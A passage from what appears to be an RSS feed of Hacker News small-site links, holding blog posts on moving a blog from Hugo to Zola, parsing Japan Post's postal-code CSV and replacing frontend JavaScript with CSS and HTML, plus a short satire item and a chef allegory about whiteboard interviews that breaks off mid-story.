<p>The migration was pretty straightforward -- I had to copy the <code>content folder</code>s of my blog (which are just a bunch of <code>.md</code> fikes) and replace <code>YAML</code> frontmatter to <code>TOML</code>. There were a few variable changes that I needed to do manually but since they were a manageable 20-25 posts, I did it by hand. I could potentially automate but then rabbit deep in the rabbit hole of Yak Shaving. The good part was that I was able to retain the same URL structure for my new blog because the URL scheme was based on the file paths.</p>
<p>I spent some time porting <a href="https://github.com/knadh/hugo-ink">hugo-ink</a> to Zola and did minor CSS tweaks to it. Zola uses the Terra language for templating and it's much more pleasing to eyes than the Go Template syntax. Zola comes with pretty neat features like Search, RSS/Atom Feeds, Syntax Highlighting and SASS-&gt;CSS Processors.</p>
<p>What took me time however was to figure out how to get <code>opengraph</code> tags in each page. Hugo provides nifty <a href="https://github.com/gohugoio/hugo/blob/master/tpl/tplimpl/embedded/templates/opengraph.html">template</a> for this use case but Zola is pretty barebones like that. People who care a lot about SEO need to spend some extra efforts here.</p>
<h3 id="future">Future</h3>
<p>Zola is still a pretty new kid on the block but the author shares the same frustration about Hugo:</p>
<blockquote>
<p>it personally drives me insane, to the point of writing my own template engine and static site generator. Yes, this is a bit biased. -- <a href="https://github.com/getzola/zola#-explanations">Source</a></p>
</blockquote>
<p>This also reflects in the issues/PRs I've seen for Zola and the author is opinionated about not adding features which would make Zola complicated. Overall I am very happy with the switch and it was long due. I feel more confident in tweaking certain sections of my website. I plan to open-source the current theme in the next few days.</p>
<p>You can read the <a href="https://git.mrkaran.dev/karan/website">Source Code</a> of this website if you'd like to explore how this website is built.</p>
<p>Fin!</p>

    </article>
</section>
</article></div>]]>
            </description>
            <link>https://mrkaran.dev/posts/migrating-to-zola/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25024170</guid>
            <pubDate>Sun, 08 Nov 2020 08:39:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Crypto Paper: Man Continues Reading After First Math Equation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25023856">thread link</a>) | @npguy
<br/>
November 7, 2020 | https://doublespend.io/2020/10/28/man-continues-reading-crypto-white-paper-after-first-mathematical-equation/ | <a href="https://web.archive.org/web/*/https://doublespend.io/2020/10/28/man-continues-reading-crypto-white-paper-after-first-mathematical-equation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>DoubleSpend has obtained exclusive video footage of a man continuing to read a white paper after the occurrence of the first mathematical equation in the paper. The video footage has been analyzed with WebGazeAnalyzer, a system for capturing and analyzing web reading behavior using eye gaze to confirm that this was not a case of the viewer moving off the page or just leaving the desk. </p>



<p>More details on this to follow soon.</p>
<div><p><a href="https://twitter.com/share?url=https://doublespend.io/2020/10/28/man-continues-reading-crypto-white-paper-after-first-mathematical-equation/&amp;text=Man%20Continues%20Reading%20Crypto%20White%20Paper%20After%20First%20Math%20Equation" title="Share on Twitter" target="_blank" rel="nofollow noopener noreferrer" data-postid="453" data-social-network="Twitter" data-social-action="Tweet" data-social-target="https://doublespend.io/2020/10/28/man-continues-reading-crypto-white-paper-after-first-mathematical-equation/"><span><span><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="29.71875" height="32" viewBox="0 0 951 1024"><path d="M925.714 233.143q-38.286 56-92.571 95.429 0.571 8 0.571 24 0 74.286-21.714 148.286t-66 142-105.429 120.286-147.429 83.429-184.571 31.143q-154.857 0-283.429-82.857 20 2.286 44.571 2.286 128.571 0 229.143-78.857-60-1.143-107.429-36.857t-65.143-91.143q18.857 2.857 34.857 2.857 24.571 0 48.571-6.286-64-13.143-106-63.714t-42-117.429v-2.286q38.857 21.714 83.429 23.429-37.714-25.143-60-65.714t-22.286-88q0-50.286 25.143-93.143 69.143 85.143 168.286 136.286t212.286 56.857q-4.571-21.714-4.571-42.286 0-76.571 54-130.571t130.571-54q80 0 134.857 58.286 62.286-12 117.143-44.571-21.143 65.714-81.143 101.714 53.143-5.714 106.286-28.571z"></path></svg></span><span>Tweet</span></span><span>0</span></a></p></div>		</div></div>]]>
            </description>
            <link>https://doublespend.io/2020/10/28/man-continues-reading-crypto-white-paper-after-first-mathematical-equation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25023856</guid>
            <pubDate>Sun, 08 Nov 2020 07:29:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Embed Gravity programming language into your code]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25023836">thread link</a>) | @creolabs
<br/>
November 7, 2020 | https://marcobambini.github.io/gravity/#/embedding | <a href="https://web.archive.org/web/*/https://marcobambini.github.io/gravity/#/embedding">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://marcobambini.github.io/gravity/#/embedding</link>
            <guid isPermaLink="false">hacker-news-small-sites-25023836</guid>
            <pubDate>Sun, 08 Nov 2020 07:25:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Parsing the Infamous Japanese Postal CSV]]>
            </title>
            <description>
<![CDATA[
Score 119 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25023673">thread link</a>) | @polm23
<br/>
November 7, 2020 | https://www.dampfkraft.com/posuto.html | <a href="https://web.archive.org/web/*/https://www.dampfkraft.com/posuto.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Late last year I released <a href="https://github.com/polm/posuto">posuto</a>, a package presenting Japanese postal code
data in an easy-to-use format. It's based on <a href="https://www.post.japanpost.jp/zipcode/dl/kogaki-zip.html">data released by Japan
Post</a>, which is infamous for being widely used but hard to parse.</p>
<figure><a href="https://www.dampfkraft.com/by-id/806ae69c/postcharacter.png"><img src="https://www.dampfkraft.com/by-id/806ae69c/img/postcharacter.png.l.png"></a><figcaption>This adorable character by <a href="https://www.irasutoya.com/2019/08/blog-post_590.html">Irasutoya</a> is cute, but the raw postal CSV data is not.
</figcaption></figure>
<p>I first became aware of the postal data when I entered my postal code in an
online form and it auto-completed my address as "XXX-borough (except the
following buildings)". I had no idea what that parenthetical was referring to,
so I looked for a common source of postal data, found the CSV, and found the
issue.  It turns out the CSV file contains parenthetical notes for anyone
reading the CSV file and makes reference to the order of the rows.</p>
<p>This causes problems. The data is mainly useful one row at a time, where the
parenthetical is meaningless. Since CSV is a field-delimited format, there's
also no need for parentheticals - you could just add a note field.</p>
<p>This is only one of many issues with <code>ken_all.csv</code>. You can find people
complaining about it regularly <a href="https://twitter.com/search?q=ken_all.csv&amp;src=typed_query&amp;f=live">on Twitter</a>, and there was
even briefly <a href="http://ken-all.hatenadiary.com/">a blog</a> just collecting posts from all over the web
about it. A <a href="https://twitter.com/bulkneets/status/1259457777862184966">particularly amusing tweet</a> describes people who expect
computers to bend to the will of humans being punished in Hell by having to
parse <code>ken_all.csv</code> forever.</p>
<p>The <a href="https://www.post.japanpost.jp/zipcode/dl/readme.html">README</a> for the file explains that lines with overly long fields will be
broken up into multiple lines. Specifically, if the neighborhood name is over
38 characters, or if the half-width katakana (<em>half-width katakana</em>)
pronunciation field is over 76 characters, the line will be split into two
lines. The overly-long neighborhood field will be continued and all other
fields will be duplicated. This is an abbreviated sample of what that looks
like:</p>
<pre><code>12345,Tokyo,Minato,This place name is really
12345,Tokyo,Minato,very long it didn't fit in
12345,Tokyo,Minato,a single line so we had to 
12345,Tokyo,Minato,split it
</code></pre>
<p>The motivation for this is not explained. Maybe there was a fixed-width buffer
for storing a line somewhere thirty years ago. I used to process CSV and other
files from hundreds of different providers at an old job and I saw many
horrors, but I've never seen this particular formatting choice anywhere else.
It should also be noted that while the length limits are as stated, the
location where line breaks are inserted in long lines appears random, occurring
neither at the character limit nor at normal word boundaries.</p>
<p>It's worth noting not all the issues with the CSV are inherently technical;
postal codes are always complicated. The postal code with the most rows in the
CSV - a stunning 66 - is 〒452-0961, which refers to the <a href="https://ja.wikipedia.org/wiki/%E6%98%A5%E6%97%A5%E7%94%BA_(%E6%84%9B%E7%9F%A5%E7%9C%8C)">Haruhi region</a> of
Kiyosu City in Aichi Prefecture. This has that many lines because every
neighborhood gets a separate line. (This particular case may be related to Haruhi
having been the smallest town by area in Japan from 2006 until 2009, when it
was incorporated into Kiyosu City.)</p>
<p>In contrast, the longest <em>continued</em> line, using the line break rules above, is
the entry for 〒602-8368 or 〒602-8374, both with eight lines. These are both in
one of a few areas in Kyoto that uses <a href="https://en.wikipedia.org/wiki/Japanese_addressing_system#Kyoto">a unique, bizarre system of
intersection-based addressing</a>. The entry looks a bit like this:</p>
<pre><code>12345,Kyoto,Kyoto,"North Town (Up Lower Godsroad from"
12345,Kyoto,Kyoto,"the West, Down Turtle Street from the"
12345,Kyoto,Kyoto,"East, Up Old Temple Road from the"
12345,Kyoto,Kyoto,"West)"
</code></pre>
<p>I have used quoted fields here, but the actual CSV doesn't quote fields and
instead uses a different kind of comma.</p>
<p>There are other issues. There are catch-all postal codes for many areas, where
the neighborhood is given as "except the following", and the only thing to do
is look for that exact string and exclude it. There's a variety of similar
strings, and it's hard to be sure I've caught them all.</p>
<p>An example of another comment is 一円. Normally this would mean "one yen", but
it also means "the area surrounding", and is a note in the CSV that should be
removed from neighborhood names, <em>except</em> for exactly one neighborhood in Shiga where
that's actually the name (〒522-0317).</p>
<p>There's also a <a href="https://www.post.japanpost.jp/zipcode/dl/roman.html">separate romaji file</a> offered by JP Post. It's updated
less frequently than the main files, is often out of sync, and the provided
romaji are extremely low quality. For the moment I'm still providing the data
in posuto in the name of consistency, but honestly you should just use
<a href="https://www.dampfkraft.com/nlp/cutlet-python-romaji-converter.html">cutlet</a>. To give an example of bad romaji:</p>
<pre><code>大手町 JAビル
OTEMACHI JIEIEIBIRU
</code></pre>
<p>What's happening here is that "JA" is being converted to the phonetic reading
in Japanese, "ジェイエイ". Then ジェ, which is written "large ji small e" but
pronounced "je", is being converted to "jie" by treating the small character as
though it were large, and the other characters are translated as-is, turning
something already in the latin alphabet into alphabet soup. For contrast,
cutlet has no problem converting "JAビル" into "JA building" (case handling
admittedly needs some work still). Similar issues turn "Roppongi Hills" into
"Roppongihiruzu", and "Sweden Hills" into "Suedenhiruzu".</p>
<p>Anyway, dealing with the file was a humbling lesson in the amount of complexity
it's possible to pack into one place. I've glossed over many details, but you
can find them covered in posuto's README.</p>
<p>You can use <a href="https://github.com/polm/posuto">posuto</a> as a library, or if you're not using Python, just
download the pre-processed JSON and make use of that. If you find a good use
for it I'd be delighted to hear about it.</p>
<p>Oh, and if you need a Win3.1 or DOS program to copy the data onto an IBM H
floppy disk, just check the bottom of <a href="https://www.post.japanpost.jp/zipcode/dl/kogaki-zip.html">JP Post's page</a> - they've
got you covered. Ψ</p>
</div></div>]]>
            </description>
            <link>https://www.dampfkraft.com/posuto.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25023673</guid>
            <pubDate>Sun, 08 Nov 2020 06:52:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I wrote JavaScript to avoid JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 29 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25023594">thread link</a>) | @asaaki
<br/>
November 7, 2020 | https://markentier.tech/posts/2020/10/wrote-javascript-to-avoid-javascript/ | <a href="https://web.archive.org/web/*/https://markentier.tech/posts/2020/10/wrote-javascript-to-avoid-javascript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Web technologies have come so far, that you realize: not everything needs to be done in JavaScript nowadays anymore.</p><blockquote><p><em>»Life is really simple, but we insist on making it complicated.« — Confucius</em></p></blockquote><p>My initial headline would have been:</p><p><em>How I wrote more JavaScript in the backend to eliminate JavaScript in the frontend.</em></p><p>But that's already a mouthful and also would have revealed too much and you might not have clicked my slightly clickbait-y title, right?</p><p>So here is my Public Service Announcement:</p><p> 📣 <strong>This site does not use any frontend JavaScript.<sup>*</sup></strong></p><p><em><small>*) There are only tiny exceptions on 2 pages, but for a good reason. More on that later.</small></em></p><p>First of all I am not against JavaScript (<span>JS</span>) at all. If you're building a web <strong>application</strong>, then this is not only totally fine but most likely a core requirement.</p><p>But I do have my pet peeve with <span>JS</span> for plain websites and blogs. Currently there is still such a strong draught in the static site generator world, telling us all our sites should be some kind of React or other frontend framework based project (looking at you, Gatsby, Next, Nuxt, VuePress, …). That you need to have that plentyful of code running in the browser of your visitors to have a smooth and <em>feels like a native app</em> user experience. That a site should be a <em>Single Page Application (SPA).</em> I can tell you, a plain HTML+CSS website does it really well, too. Surprise!</p><p>While on one hand the browser vendors add more and more <a href="https://developer.mozilla.org/en-US/docs/Web/API">Web APIs</a>, we also got a lot of improvement in the HTML and CSS area. Usually there is no big hype train around them, unless you are very enthusiastic and live in that niche.</p><p>Take a look at <a href="https://caniuse.com/">caniuse.com</a> to get an idea what is possible today and what might come tomorrow. <em>Did you know that HTML5 is still iterated on and we're moving towards <a href="https://www.w3.org/TR/html53/">version 5.3</a>?</em> On the other hand »HTML 5« is also used as an umbrella term for a <a href="https://spec.whatwg.org/" title="WHATWG Standards">wide variety of standards</a>. Also for CSS the story got very interesting: while CSS until 2.1 was a single specification, since CSS 3 there is a whole potpourri of recommendations and drafts. The <a href="https://wiki.csswg.org/spec">wiki of the CSS Working Group</a> might be a good starting point for further discovery.</p><p>But I want to give you some more practical examples and an experience report:</p><h2 id="sticky-navigation-bar">Sticky navigation bar</h2><p>This is something you can observe here on this blog:</p><video autoplay="" loop="" muted="" playsinline=""><source src="https://markentier.tech/posts/2020/10/wrote-javascript-to-avoid-javascript/pos-sticky.hvec.mp4" type="video/mp4; codecs=hvc1"><source src="https://markentier.tech/posts/2020/10/wrote-javascript-to-avoid-javascript/pos-sticky.hvec.mp4" type="video/mp4; codecs=hevc"><source src="https://markentier.tech/posts/2020/10/wrote-javascript-to-avoid-javascript/pos-sticky.h264.mp4" type="video/mp4; codecs=avc1"><source src="https://markentier.tech/posts/2020/10/wrote-javascript-to-avoid-javascript/pos-sticky.webm" type="video/webm; codecs=vp9"></video><p>The key ingredient is the CSS <code>position: sticky</code> <a href="https://caniuse.com/css-sticky">🛈</a>. Even though most of them are labeled as <em>partial support,</em> this property value can be used in most scenarios except in some table related cases. If you want a sticky menu after scrolling and use only elements like <code>div</code> everything is just fine. I could throw away all the code for that after I realized that none of the common and modern browsers had any blocking issues. So I did. The only real latecomers were the web view components, no big deal for me here.</p><h3 id="before">Before</h3><h4 id="javascript">JavaScript</h4><pre><code><span>const </span><span>navbar </span><span>= </span><span>document</span><span>.querySelector(</span><span>'.navbar'</span><span>);
</span><span>let </span><span>sticky </span><span>= </span><span>navbar.offsetTop;
</span><span>const </span><span>navbarScroll </span><span>= </span><span>() </span><span>=&gt; </span><span>{
  </span><span>if </span><span>(</span><span>window</span><span>.pageYOffset </span><span>&gt;= </span><span>sticky) {
    navbar.classList.add(</span><span>'sticky'</span><span>)
  } </span><span>else </span><span>{
    navbar.classList.remove(</span><span>'sticky'</span><span>);
  }
};

</span><span>window</span><span>.onscroll </span><span>= </span><span>navbarScroll;
</span></code></pre><h4 id="stylesheet">Stylesheet</h4><pre><code><span>.navbar </span><span>{
  </span><span>position</span><span>: </span><span>relative</span><span>;
}
</span><span>.sticky </span><span>{
  </span><span>position</span><span>: </span><span>fixed</span><span>;
  </span><span>top</span><span>: </span><span>0</span><span>;
  </span><span>left</span><span>: </span><span>0</span><span>;
}
</span></code></pre><h3 id="after">After</h3><h4 id="javascript-1">JavaScript</h4><pre><code><span>// nope
</span></code></pre><h4 id="stylesheet-1">Stylesheet</h4><pre><code><span>.navbar </span><span>{
  </span><span>position</span><span>: </span><span>sticky</span><span>;
  </span><span>top</span><span>: </span><span>0</span><span>; </span><span>/* it does not reposition right away,
             but determines at which point it sticks */
</span><span>}
</span></code></pre><h3 id="resolution">Resolution</h3><p>The workaround with <span>JS</span> is no more. Yay!</p><p>Also notice how little code is actually needed now? Two CSS properties and the job is done.</p><hr><h2 id="service-workers">Service Workers</h2><p>Also in 2018 I played with <a href="https://markentier.tech/posts/2018/04/progressive-web-app/">Progressive Web Apps (PWA)</a>. The whole blog was one. A few days ago I teared down all of it. At the core of PWAs sit <a href="https://serviceworke.rs/">Service Workers (SW)</a>, though you can use SW also without building an app. And that's what I was aiming for, but in the end my home-grown dynamic cache solution was more annoying to me than helpful for anyone else. Every time I updated anything here, I had to wait and/or force refresh to see the result. I'm sure some people probably see visual inconsistencies due to a still running service worker in their browser. If you do, try to force clear all data for this website.</p><p>Long story short: if you do not build a web <strong>app</strong>, you most likely do not need service workers. So yet another thing down from the <span>JS</span> list.</p><p>No <em>before/after</em> comparison here, but several precious kilobytes of JavaScript shaved off by removing them.</p><hr><h2 id="sqip-svg-lqip">SQIP (SVG LQIP)</h2><p><em>Woa, what are all these random acronyms here?</em> Don't worry, the simple answer is:</p><p>If you have images and they are not very small in file size, you maybe want to provide a temporary placeholder with very low resolution and quality. This is pretty useful for slow internet connections; living here in Germany I know how difficult this situation can be. That thing called internet is still very Neuland to us. 🤦</p><p>Anyway, <code>SQIP</code> can be translated with »<code>SVG</code>-based <code>LQIP</code>.«</p><p><code>SVG</code> are Scalable Vector Graphics, an image format I really love a lot, my logo is done with it (<a href="https://markentier.tech/posts/2018/05/minimalism-focus-clean-redesign/">I wrote about it a while ago</a>).</p><p>LQIP finally stands for <em>»Low Quality Image Placeholders«</em> and is based on an algorithm to find primitive shapes to describe the source image. Basically try to find only a few triangles, rectangles, circles, ellipsis, and other low poly shapes. It is also an art form in its own, you can enjoy some <a href="https://github.com/fogleman/primitive#static-animation">nice examples there</a>. The advantage of SVG is that it is made to encode such figures in very few characters of human readable text, so a less complex image for a placeholder can be written in one kilobyte or less.</p><p>Compared to the original high resolution image which can easily weigh half a megabyte and more this is great. You can reserve the space in your page and very early in the loading process display some visual hint that there will be a proper picture soon. Especially for types which do not support progessive loading (as JPEG can) using SQIP/LQIP placeholders makes a lot of sense.</p><p>In this scenario at first it was not really about saving frontend <span>JS</span>, more about saving it on the backend site and replacing it with something else. Unfortunately in between some code creeped into the frontend anyway.</p><p>But what happened that this beautiful technique fell out of favor with me?</p><h3 id="picture"><code>&lt;picture&gt;</code></h3><p>Enter another interesting HTML tag combo: <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/picture"><code>&lt;picture&gt;</code></a> with <code>&lt;source&gt;</code>.</p><p>So one reason to use small low quality placeholders is because before such tags became a thing we solely relied on a single <code>&lt;img&gt;</code> and some trickery with CSS (and sometimes aided by sprinkles of JavaScript). I tried to avoid <span>JS</span> completely, but of course I had to use some styling hacks eventually.</p><p>The essence of it was some style attached to the image in question:</p><pre><code><span>&lt;</span><span>img </span><span>src</span><span>=</span><span>"highres-and-heavy.png"
     </span><span>style</span><span>=</span><span>"</span><span>background-size</span><span>: </span><span>cover</span><span>;
            </span><span>background-image</span><span>: </span><span>url</span><span>(</span><span>'data:image/svg+xml;base64,PHN2…'</span><span>);</span><span>"</span><span>&gt;
</span><span>&lt;!-- Usually in some post processing all style attributes were collected
     into a &lt;style&gt; tag or CSS file. --&gt;
</span></code></pre><p>The JavaScript entered this scenery at one point: after I used images with transparency. Sadly with this background image workaround you would've seen the low quality placeholder through the transparent parts, and this was extremly ugly to be honest. I could not stand it and deployed some snippet to trigger a background removal once the actual image was loaded:</p><pre><code><span>// remove the background image styling, so transparent images won't have
// strange SQIP artefacts shining through
</span><span>document</span><span>.querySelectorAll(
  </span><span>"img[loading=lazy][class]:not(.thumbnail):not(.loaded)"
</span><span>).forEach((</span><span>img</span><span>) </span><span>=&gt; </span><span>{
  </span><span>img</span><span>.</span><span>onload </span><span>= </span><span>(</span><span>_event</span><span>) </span><span>=&gt; </span><span>img.className </span><span>= </span><span>"loaded"</span><span>;
});
</span><span>document</span><span>.querySelectorAll(
  </span><span>"img[loading=lazy].thumbnail:not(.loaded)"
</span><span>).forEach((</span><span>img</span><span>) </span><span>=&gt; </span><span>{
  </span><span>img</span><span>.</span><span>onload </span><span>= </span><span>(</span><span>_event</span><span>) </span><span>=&gt; </span><span>img.className </span><span>= </span><span>"thumbnail loaded"</span><span>;
});
</span></code></pre><p>Theoretically it would have been tolerable, but I noticed some strange behaviour once I started wrapping my images into <code>picture</code> tags.</p><p>Let's <a href="https://en.wiktionary.org/wiki/yak_shaving">shave the yak</a> a bit further to understand why.</p><h4 id="webp-and-avif">WEBP and AVIF</h4><p><em>Come on, more acronyms?</em> I'm sorry, the web is a place with a lot of them.</p><p>All you need to know for now is that both of them are pretty modern image formats with quite good (lossy) compression rates while keeping a respectable quality. <a href="https://caniuse.com/webp"><code>WEBP</code></a> has been around for some time and most of the browsers do support it. <a href="https://caniuse.com/avif"><code>AVIF</code></a> is extremly new and right now only Chrome since version 85 and Opera 71 can display them. Firefox has a configuration flag, maybe they will enable it by default pretty soon.</p><p>So the current situation is that I have my original image (PNG or JPEG in most cases), a WEBP version, an AVIF version, and the SQIP placeholder. How do I deal with it? Back to our <code>&lt;picture&gt;</code> tag:</p><pre><code><span>&lt;</span><span>picture</span><span>&gt;
  &lt;</span><span>source </span><span>srcset</span><span>=</span><span>"./cover.avif" </span><span>type</span><span>=</span><span>"image/avif"</span><span>&gt;
  &lt;</span><span>source </span><span>srcset</span><span>=</span><span>"./cover.webp" </span><span>type</span><span>=</span><span>"image/webp"</span><span>&gt;
  &lt;</span><span>img </span><span>src</span><span>=</span><span>"./cover.png"
       </span><span>style</span><span>=</span><span>"</span><span>/* SQIP data: see example above */</span><span>"</span><span>&gt;
&lt;/</span><span>picture</span><span>&gt;
</span></code></pre><p>You can also use source sets for different view sizes based on media queries, but in my case I'm mainly concerned about supporting different image formats. My idea is to prioritize the formats with the smallest file size first, and given the compression ratios the order is usually: AVIF, WEBP, PNG/JPG. Not in every case will this be true; WEBP does not always have better savings then a decently compressed JPEG for example. AVIF has not disappointed so far, but sadly a part of my visitors will not see the effect yet.</p><p>What did not really happen anymore was a display of the placeholder before the final image was loaded. I experimented for quite some time until I realized that I do not want to spent more energy any further.</p><p><picture><source srcset="https://markentier.tech/posts/2020/10/wrote-javascript-to-avoid-javascript/sizes-png-webp-avif.w.avif" type="image/avif"><source srcset="https://markentier.tech/posts/2020/10/wrote-javascript-to-avoid-javascript/sizes-png-webp-avif.w.webp" type="image/webp"><img src="https://markentier.tech/posts/2020/10/wrote-javascript-to-avoid-javascript/sizes-png-webp-avif.w.png" alt="Size comparison of an example image; PNG original (22 KB), WEBP (14 KB, 37% saved), AVIF (7.3 KB, 67% saved)" width="1024" height="120" loading="lazy"></picture></p><p>I made a <em>risk-return tradeoff</em> compromise and got rid of SQIP altogether. For the growing number of AVIF support the images are sometimes significantly smaller which makes it acceptable to allow for some display delay anyway.</p><p>In the following screenshot the JPEG was the source photo. The PNG was created for some transparency stuff; of course, for photos this format does not really make a lot of sense in general. Sadly also WEBP fails to compete in this scenario. That's why I have to make this picture group generation a bit smarter soon to reorder based on the actual file …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://markentier.tech/posts/2020/10/wrote-javascript-to-avoid-javascript/">https://markentier.tech/posts/2020/10/wrote-javascript-to-avoid-javascript/</a></em></p>]]>
            </description>
            <link>https://markentier.tech/posts/2020/10/wrote-javascript-to-avoid-javascript/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25023594</guid>
            <pubDate>Sun, 08 Nov 2020 06:30:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Allegory on Whiteboard Interviews]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25023574">thread link</a>) | @mntonyc
<br/>
November 7, 2020 | http://www.unlimitednovelty.com/2011/12/can-you-solve-this-problem-for-me-on.html | <a href="https://web.archive.org/web/*/http://www.unlimitednovelty.com/2011/12/can-you-solve-this-problem-for-me-on.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-2047521258973142246" itemprop="description articleBody"><p>
Jim is a great chef. He's too modest to say that about himself, but he's worked either as head chef or&nbsp;assistant&nbsp;head chef at a number of restaurants. Everywhere he's worked he's been dependent and reliable, prepared great food, worked well with the other chefs, and is generally a fun guy to have in the kitchen. Unfortunately, due to the poor economy and some bad decisions by management, Jim's restaurant is about to close, so Jim is out of work and looking for a new job.</p>
<p>
There's a new restaurant opening, a fancy place with many well-to-do investors. In Jim's world, chefs are hard to find, so Jim assumes he's a shoo-in for the job. Jim arrives at the interview at a Mexican restaurant, which feels like a great fit for Jim because Mexican food is his specialty. Jim calls up the restaurant on the phone and chats with the manager about a chef position, and the manager likes what he hears enough to schedule a job interview for Jim.</p>

<p>
Jim arrives at the interview and talks to the manager a bit. Things seem to be going well, Jim is in his element at a Mexican restaurant. The initial meeting goes well: Jim talks his job history, how much he cares about having a fresh house salsa, and how good his Baja sauce is. "Look up the Yelp reviews of my Baja sauce!" remarks Jim. "It's the #1 reason people came to the last restaurant I worked at." The manager smiles and nods, and informs Jim he looks great on paper, however the remainder of the interview will be conducted by all of the other chefs in the kitchen. "Awesome!" Jim thinks, "I have a rapport with other chefs. This should go smoothly."</p>

<p>
The first chef walks in, sits down at the table, and coldly stares at Jim's resume. "Can you write down a&nbsp;recipe for me?" he asks Jim, "There's a whiteboard over there, can you write down your preferred recipe for crème brûlée?"</p>

<p>
Jim is a bit dumbfounded, both by the request and being asked to demonstrate his cooking ability on a whiteboard. "I'm sorry," he says, "I don't know how to make&nbsp;crème brûlée. I thought this was a Mexican restaurant. Would you like to know my favorite recipe for Flan?"</p>

<p>
"No, that won't do," the assistant chef says. "Please write down how you would prepare&nbsp;crème brûlée"</p>

<p>
Jim is a bit taken aback, first because he's a specialist in Mexican food, and second because instead of being asked to cook, he's being asked to write stuff on a whiteboard. "I honestly don't know how to make&nbsp;crème brûlée," Jim says. "Perhaps you could let me google the recipe and I could actually try to prepare it for you, instead of just demonstrating a rote ability to memorize recipes and write them down on a whiteboard."</p>

<p>
"No, that won't do," says the interviewer, who jots down "lack of confectionary skills" in his notes. "Can you at least attempt to write down how you would prepare&nbsp;crème brûlée?"</p>
<p>
Jim feels embarrassed   and lost. He's being asked to do something he would never have to do in a professional capacity, and worse, rather than actually doing it, he's being asked to describe how he would do it on a whiteboard. Perhaps this is a test of Jim's ability to think on his feet, but given the position he's being asked to interview for and the question he's been presented, it's certainly an unfair one. Jim picks up the black marker and thinks hard about what the possible ingredients of&nbsp;crème brûlée would be.</p>
<p>
"Well," says Jim, "I'll need cream." Jim pulls the cap off the marker and attempts to write "1. Cream", however the marker is dry and the whiteboard is on wheels that roll back when Jim attempts to write. Jim only succeeds in making a long, barely perceptible mark on the whiteboard. Having made a messy mark on the whitebard, Jim looks for an eraser but there isn't one.</p>

<p>
"Yes," says the interviewer sarcastically, rolling his eyes, "<i>obviously</i> you need cream for&nbsp;crème brûlée. Try a different marker." Jim picks up the red marker and tries to write with that to the same result, it's dried out and won't work. Frustrated, Jim puts it down and tries the green marker, which works fine, however the board swivels vertically as he tries to write. Jim grabs the board in the upper right corner and finally manages to jot down "1. Cream"</p>

<p>
"Okay, we have the most obvious ingredient down," says the assistant chef. "Can you think of any other ingredients that would go into&nbsp;crème brûlée?"</p>

<p>
"Sugar," says Jim. The assistant chef nods, and Jim writes down sugar. "What else?"</p>

<p>
"Milk," says Jim, and he begins to write it down before he comes to the realization that the cream and milk are redundant. Jim doesn't often cook with cream. The interviewer shakes his head in exasperation   and pinches the bridge of his nose as Jim looks dumbfounded. "It's not milk brûlée," he says. Unfortunately, there's no eraser, so Jim tries to erase "3. Milk" with his hand, smearing green ink all over the board and his hand before asking "do you have an eraser?" The interviewer looks around unenthusiastically before shrugging no. Jim continues smearing the marker's ink across the surface of the board with his fingertips in a desperate attempt to compensate for the absence of an eraser.</p>

<p>
"Can you think of any other ingredients that might go in&nbsp;crème&nbsp;brûlée?" asks the interviewer, clearly bored.</p>

<p>
"Eggs?" asks Jim. The interviewer nods. Jim writes down "eggs". "What else?" the interviewer asks. Jim stares at what he's written down: cream, sugar, eggs. "Well," says Jim, "I assume some kind of flavoring. Chocolate perhaps?"</p>

<p>
"Wrong," says the interviewer. "Please write vanilla." Jim looks confused for a second and jots down vanilla as asked. The interviewer jots down "trouble with basic recipes" before asking "What other ingredients can you think of?"</p>

<p>
Jim stares at the ingredients so far: cream, sugar, eggs, vanilla. "Perhaps some water?" Jim guesses. The interviewer nods, and Jim writes down water. "Now, what are you missing?" asks the interviewer.</p>

<p>
Jim stares at the list: cream, sugar, eggs, vanilla, water. Those seem like they should be the basic ingredients, and the interviewer rejected additional flavoring that wasn't vanilla. Jim is stupefied... he can't think of anything else. Taking a stab in the dark, Jim suggests "Salt?"</p>

<p>
The assistant chef does a facepalm and sighs, before looking up at Jim and stating the obvious solution: "the units. Your recipe is lacking units." The ambiguity of the interviewer's question has caught Jim off guard, especially when he professed no idea of what the recipe was to being with, and worse, he has absolutely no idea what the units should be. He stares at the whiteboard for awhile before asking "how much&nbsp;crème&nbsp;brûlée are we making?"</p>

<p>
"That's up to you," says the interviewer, "how many servings would you like to prepare?"</p>

<p>
Jim has absolutely no clue. He's not a confectioner, but he doesn't want to completely bomb the interview, so he ventures a guess. "I'd like to prepare 2 servings. Let's try a cup of cream, a teaspoon of vanilla, two tablespoons of sugar, 4 eggs, and a cup of water."</p>

<p>
"Those aren't the right proportions," say the interviewer. "You should use a quart of cream, two quarts water, a teaspoon of vanilla extract, a cup of sugar, and six eggs to produce six servings. Let's move on to the recipe. Can you write it down on the whiteboard for me?"</p>

<p>
